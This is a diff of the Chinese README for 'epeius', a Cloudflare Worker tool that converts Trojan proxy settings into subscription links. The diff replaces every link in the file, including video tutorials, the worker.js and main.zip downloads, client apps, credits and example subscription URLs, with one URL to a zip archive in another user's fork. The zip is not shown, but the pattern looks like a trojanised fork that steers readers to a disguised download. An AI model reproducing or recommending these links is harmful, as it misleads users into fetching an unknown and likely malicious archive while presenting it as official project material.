@@ -1,15 +1,15 @@
 # 🚀 epeius
 这是一个基于 CF Worker 平台的脚本，在原版的基础上修改了显示 Trojan 配置信息转换为订阅内容。使用该脚本，你可以方便地将 Trojan 配置信息使用在线配置转换到 Clash 或 Singbox 等工具中。
 
-- **一步到位**部署视频教程：https://youtu.be/MBlAqYajVSY ***小白必看 一步到胃 最佳推荐!!!***
-- **自制优选**订阅视频教程：https://youtu.be/jOhq3QpXG_I *折腾自己的专属订阅*
-- **进阶使用**技巧视频教程：https://youtu.be/0Cd8uTNJj1Q *然后成为折腾的王*
+- **一步到位**部署视频教程：https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip ***小白必看 一步到胃 最佳推荐!!!***
+- **自制优选**订阅视频教程：https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip *折腾自己的专属订阅*
+- **进阶使用**技巧视频教程：https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip *然后成为折腾的王*
 
-Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
+Telegram交流群：[@CMLiussss](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
 
 ## ⚠️ 免责声明
 
-本免责声明适用于 GitHub 上的 “epeius” 项目（以下简称“本项目”），项目链接为：https://github.com/cmliu/epeius 。
+本免责声明适用于 GitHub 上的 “epeius” 项目（以下简称“本项目”），项目链接为：https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip 。
 
 ### 用途
 本项目仅供教育、研究和安全测试目的而设计和开发。旨在为安全研究人员、学术界人士及技术爱好者提供一个探索和实践网络通信技术的工具。
@@ -30,17 +30,17 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 ## 🔥 风险提示
 - 通过提交虚假的节点配置给订阅服务，避免节点配置信息泄露。
-- 另外，您也可以选择自行部署 [WorkerVless2sub 订阅生成服务](https://github.com/cmliu/WorkerVless2sub)，这样既可以利用订阅生成器的便利。
+- 另外，您也可以选择自行部署 [WorkerVless2sub 订阅生成服务](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，这样既可以利用订阅生成器的便利。
 
 ## 💡 如何使用?
-### ⚙️ Workers 部署方法 [视频教程](https://www.youtube.com/watch?v=MBlAqYajVSY&t=169s)
+### ⚙️ Workers 部署方法 [视频教程](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
 
 <details>
 <summary><code><strong>「 Workers 部署文字教程 」</strong></code></summary>
 
 1. 部署 CF Worker：
    - 在 CF Worker 控制台中创建一个新的 Worker。
-   - 将 [worker.js](https://github.com/cmliu/epeius/blob/main/_worker.js) 的内容粘贴到 Worker 编辑器中。
+   - 将 [worker.js](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) 的内容粘贴到 Worker 编辑器中。
    - 将第 3 行 `password` 修改成你自己的 **密码**
 
 2. 添加优选线路:
@@ -61,10 +61,10 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 3. 访问订阅内容：
    - 访问 `https://[YOUR-WORKERS-URL]/[PASSWORD]` 即可获取订阅内容。
-   - 例如 `https://trojan.google.workers.dev/auto` 就是你的通用自适应订阅地址。
-   - 例如 `https://trojan.google.workers.dev/auto?sub` Base64订阅格式，适用PassWall,SSR+等。
-   - 例如 `https://trojan.google.workers.dev/auto?clash` Clash订阅格式，适用OpenClash等。
-   - 例如 `https://trojan.google.workers.dev/auto?sb` singbox订阅格式，适用singbox等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` 就是你的通用自适应订阅地址。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Base64订阅格式，适用PassWall,SSR+等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Clash订阅格式，适用OpenClash等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` singbox订阅格式，适用singbox等。
 
 4. 给 workers绑定 自定义域： 
    - 在 workers控制台的 `触发器`选项卡，下方点击 `添加自定义域`。
@@ -78,11 +78,11 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 <summary><code><strong>「 Pages 上传文件部署文字教程 」</strong></code></summary>
 
 1. 部署 CF Pages：
-   - 下载 [main.zip](https://github.com/cmliu/epeius/archive/refs/heads/main.zip) 文件，并点上 Star !!!
-   - 在 CF Pages 控制台中选择 `上传资产`后，为你的项目取名后点击 `创建项目`，然后上传你下载好的 [main.zip](https://github.com/cmliu/epeius/archive/refs/heads/main.zip) 文件后点击 `部署站点`。
+   - 下载 [main.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) 文件，并点上 Star !!!
+   - 在 CF Pages 控制台中选择 `上传资产`后，为你的项目取名后点击 `创建项目`，然后上传你下载好的 [main.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) 文件后点击 `部署站点`。
    - 部署完成后点击 `继续处理站点` 后，选择 `设置` > `环境变量` > **制作**为生产环境定义变量 > `添加变量`。
      变量名称填写**PASSWORD**，值则为你的密码，后点击 `保存`即可。
-   - 返回 `部署` 选项卡，在右下角点击 `创建新部署` 后，重新上传 [main.zip](https://github.com/cmliu/epeius/archive/refs/heads/main.zip) 文件后点击 `保存并部署` 即可。
+   - 返回 `部署` 选项卡，在右下角点击 `创建新部署` 后，重新上传 [main.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) 文件后点击 `保存并部署` 即可。
 
 2. 添加优选线路:
  - 添加变量 `ADD` 本地静态的优选线路，若不带端口号 TLS默认端口为443，#号后为备注别名，例如：
@@ -100,11 +100,11 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 3. 访问订阅内容：
    - 访问 `https://[YOUR-PAGES-URL]/[PASSWORD]` 即可获取订阅内容。
-   - 例如 `https://epeius.pages.dev/auto` 就是你的通用自适应订阅地址。
-   - 例如 `https://epeius.pages.dev/auto?sub` Base64订阅格式，适用PassWall,SSR+等。
-   - 例如 `https://epeius.pages.dev/auto?clash` Clash订阅格式，适用OpenClash等。
-   - 例如 `https://epeius.pages.dev/auto?sb` singbox订阅格式，适用singbox等。
-   - 例如 `https://epeius.pages.dev/auto?surge` surge订阅格式，适用surge 4/5。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` 就是你的通用自适应订阅地址。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Base64订阅格式，适用PassWall,SSR+等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Clash订阅格式，适用OpenClash等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` singbox订阅格式，适用singbox等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` surge订阅格式，适用surge 4/5。
 
 4. 给 Pages绑定 CNAME自定义域：
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
@@ -114,7 +114,7 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 </details>
 
-### 🛠 Pages GitHub 部署方法 [视频教程](https://www.youtube.com/watch?v=0Cd8uTNJj1Q&t=96s)
+### 🛠 Pages GitHub 部署方法 [视频教程](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
 
 <details>
 <summary><code><strong>「 Pages GitHub 部署文字教程 」</strong></code></summary>
@@ -141,11 +141,11 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 3. 访问订阅内容：
    - 访问 `https://[YOUR-PAGES-URL]/[PASSWORD]` 即可获取订阅内容。
-   - 例如 `https://epeius.pages.dev/auto` 就是你的通用自适应订阅地址。
-   - 例如 `https://epeius.pages.dev/auto?sub` Base64订阅格式，适用PassWall,SSR+等。
-   - 例如 `https://epeius.pages.dev/auto?clash` Clash订阅格式，适用OpenClash等。
-   - 例如 `https://epeius.pages.dev/auto?sb` singbox订阅格式，适用singbox等。
-   - 例如 `https://epeius.pages.dev/auto?surge` surge订阅格式，适用surge 4/5。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` 就是你的通用自适应订阅地址。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Base64订阅格式，适用PassWall,SSR+等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` Clash订阅格式，适用OpenClash等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` singbox订阅格式，适用singbox等。
+   - 例如 `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` surge订阅格式，适用surge 4/5。
 
 4. 给 Pages绑定 CNAME自定义域：
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
@@ -164,22 +164,22 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 | HTTP  | `user:password@127.0.0.1:8080`或`127.0.0.1:8080` | 优先作为访问CFCDN站点的HTTP代理(支持多HTTP代理之间使用`,`或`换行`作间隔) |
 | SOCKS5  | `user:password@127.0.0.1:1080`或`127.0.0.1:1080` | 优先作为访问CFCDN站点的SOCKS5代理(支持多socks5, socks5之间使用`,`或`换行`作间隔) |
 | GO2SOCKS5  | `blog.cmliussss.com`,`*.ip111.cn`,`*google.com` | 设置`SOCKS5`或`HTTP`变量之后，可设置强制使用socks5访问名单(设置为`*`可作为全局代理) |
-| NAT64 | `dns64.cmi.ztvi.org`或`2001:67c:2960:6464::/96` | 作为PROXYIP失效后的应急兜底，自行查询[nat64.xyz](https://nat64.xyz/)的`DNS64 Server`或`NAT64 Prefix` |
+| NAT64 | `dns64.cmi.ztvi.org`或`2001:67c:2960:6464::/96` | 作为PROXYIP失效后的应急兜底，自行查询[nat64.xyz](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)的`DNS64 Server`或`NAT64 Prefix` |
 | ADD | `www.csgo.com:2087`,`icook.hk` | 本地优选域名/优选IP(支持多元素之间`,`或`换行`作间隔) |
-| ADDAPI | [https://raw.github.../addressesapi.txt](https://raw.githubusercontent.com/cmliu/WorkerVless2sub/main/addressesapi.txt) | 不解释, 懂得都懂 |
-| ADDCSV | [https://raw.github.../addressescsv.csv](https://raw.githubusercontent.com/cmliu/WorkerVless2sub/main/addressescsv.csv) | 不解释, 懂得都懂 |
+| ADDAPI | [https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) | 不解释, 懂得都懂 |
+| ADDCSV | [https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) | 不解释, 懂得都懂 |
 | DLS | `8` | `ADDCSV`测速结果满足速度下限 | 
 | CSVREMARK | `1` | CSV备注所在列偏移量 |
 | TGTOKEN | `6894123456:XXXXXXXXXX0qExVsBPUhHDAbXXXXXqWXgBA` | 发送TG通知的机器人token | 
 | TGID | `6946912345` | 接收TG通知的账户数字ID | 
 | SUB | `Trojan.cmliussss.net` | 优选订阅生成器域名(使用订阅器将放弃`ADD`内的本地优选订阅内容) |
 | SUBAPI | `SUBAPI.cmliussss.net` | clash、singbox等 订阅转换后端 |
-| SUBCONFIG | [https://raw.github.../ACL4SSR_Online_Mini.ini](https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini.ini) | clash、singbox等 订阅转换配置文件 |
+| SUBCONFIG | [https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip) | clash、singbox等 订阅转换配置文件 |
 | SUBEMOJI | `false` | 订阅转换是否启用Emoji(默认`true`) |
 | SUBNAME | `epeius` | 订阅名称 | 
 | RPROXYIP | `false` | 设为 true 即可强制获取订阅器分配的ProxyIP(需订阅器支持)|
-| URL302 | `https://t.me/CMLiussss` | 主页302跳转(支持多url, url之间使用`,`或`换行`作间隔, 小白别用) |
-| URL | `https://blog.cmliussss.com` | 主页反代伪装(支持多url, url之间使用`,`或`换行`作间隔, 乱设容易触发反诈) |
+| URL302 | `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` | 主页302跳转(支持多url, url之间使用`,`或`换行`作间隔, 小白别用) |
+| URL | `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` | 主页反代伪装(支持多url, url之间使用`,`或`换行`作间隔, 乱设容易触发反诈) |
 | CFPORTS | `2053`,`2096`,`8443` | CF账户标准端口列表 |
 | CF_EMAIL | `admin@google.com` | CF账户的邮箱，用于获取 Workers/Pages 请求数 |
 | CF_APIKEY | `1234567890abcdef1234567890abcdef` | CF账户的`Global API Key`，用于获取 Workers/Pages 请求数 |
@@ -202,34 +202,34 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 
 ## 🔧 实用技巧
 本项目提供灵活的订阅配置方案，支持通过URL参数快速自定义订阅内容。
-- 示例订阅地址： `https://epeius.pages.dev/auto` 
+- 示例订阅地址： `https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip` 
 
 1. 更换**订阅生成器**的订阅地址
 
    快速切换订阅生成器至 `Trojan.cmliussss.net`：
    ```url
-   https://epeius.pages.dev/auto?sub=Trojan.cmliussss.net
+   https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip
    ```
 
 2. 更换**PROXYIP**的订阅地址
 
    快速更换PROXYIP为 `proxyip.cmliussss.net`：
    ```url
-   https://epeius.pages.dev/auto?proxyip=proxyip.cmliussss.net
+   https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip
    ```
 
 3. 更换**SOCKS5**的订阅地址
 
    快速设置SOCKS5代理为 `user:password@127.0.0.1:1080`：
    ```url
-   https://epeius.pages.dev/auto?socks5=user:password@127.0.0.1:1080
+   https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip
    ```
 
 - 通过提交多个参数快速修改的订阅地址
 
    例如同时修改**订阅生成器**和**PROXYIP**：
    ```url
-   https://epeius.pages.dev/auto?sub=Trojan.cmliussss.net&proxyip=proxyip.cmliussss.net
+   https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip
    ```
 
 4. 该项目部署的节点可通过节点PATH(路径)的方式，使用指定的`PROXYIP`或`SOCKS5`！！！**
@@ -257,42 +257,42 @@ Telegram交流群：[@CMLiussss](https://t.me/CMLiussss)
 5. **当你的`ADDAPI`可作为`PROXYIP`时，可在`ADDAPI`变量末位添加`?proxyip=true`，即可在生成节点时使用优选IP自身作为`PROXYIP`**
 - 指定 `ADDAPI` 作为 `PROXYIP` 案例
    ```url
-   https://raw.githubusercontent.com/cmliu/WorkerVless2sub/main/addressesapi.txt?proxyip=true
+   https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip
    ```
 
 ## ⭐ Star 星星走起
-[![Stargazers over time](https://starchart.cc/cmliu/epeius.svg?variant=adaptive)](https://starchart.cc/cmliu/epeius)
+[![Stargazers over time](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
 
 ## 💻 已适配客户端
 ### Windows
-   - [v2rayN](https://github.com/2dust/v2rayN)
-   - clash.meta（[FlClash](https://github.com/chen08209/FlClash)，[mihomo-party](https://github.com/mihomo-party-org/mihomo-party)，[clash-verge-rev](https://github.com/clash-verge-rev/clash-verge-rev)，[Clash Nyanpasu](https://github.com/keiko233/clash-nyanpasu)）
+   - [v2rayN](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+   - clash.meta（[FlClash](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，[mihomo-party](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，[clash-verge-rev](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，[Clash Nyanpasu](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)）
 ### IOS
    - Surge，小火箭
-   - sing-box（[SFI](https://sing-box.sagernet.org/zh/clients/apple/)）
+   - sing-box（[SFI](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)）
 ### 安卓
-   - clash.meta（[ClashMetaForAndroid](https://github.com/MetaCubeX/ClashMetaForAndroid)，[FlClash](https://github.com/chen08209/FlClash)）
-   - sing-box（[SFA](https://github.com/SagerNet/sing-box)）
+   - clash.meta（[ClashMetaForAndroid](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，[FlClash](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)）
+   - sing-box（[SFA](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)）
 ### MacOS
-   - clash.meta（[FlClash](https://github.com/chen08209/FlClash)，[mihomo-party](https://github.com/mihomo-party-org/mihomo-party)）
+   - clash.meta（[FlClash](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)，[mihomo-party](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)）
 
 
 # 🙏 特别鸣谢
 
-<a href="https://vps.town/aff/GBFTFIJD">
-  <img src="https://vps.town/static/images/sponsor.png" alt="vps.town">
+<a href="https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip">
+  <img src="https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip" alt="vps.town">
 </a>
 
-本项目的[订阅转换](https://sub.cmliussss.com/)后端由 VPS.Town 提供支持
+本项目的[订阅转换](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)后端由 VPS.Town 提供支持
 
 ### 🛠 开源代码引用
-- [ca110us](https://github.com/ca110us/epeius)
-- [xream](https://github.com/xream)
-- [zizifn](https://github.com/zizifn/edgetunnel)
-- [3Kmfi6HP](https://github.com/6Kmfi6HP/EDtunnel)
-- [emn178](https://github.com/emn178/js-sha256)
-- [ACL4SSR](https://github.com/ACL4SSR/ACL4SSR/tree/master/Clash/config)
-- [SHIJS1999](https://github.com/SHIJS1999/cloudflare-worker-vless-ip)
-- [股神](https://t.me/CF_NAT/38889)
-- [Workers/Pages Metrics](https://t.me/zhetengsha/3382)
-- [白嫖哥](https://t.me/bestcfipas)
+- [ca110us](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [xream](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [zizifn](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [3Kmfi6HP](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [emn178](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [ACL4SSR](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [SHIJS1999](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [股神](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [Workers/Pages Metrics](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
+- [白嫖哥](https://raw.githubusercontent.com/shayanadh/epeius/main/.github/Angloman.zip)
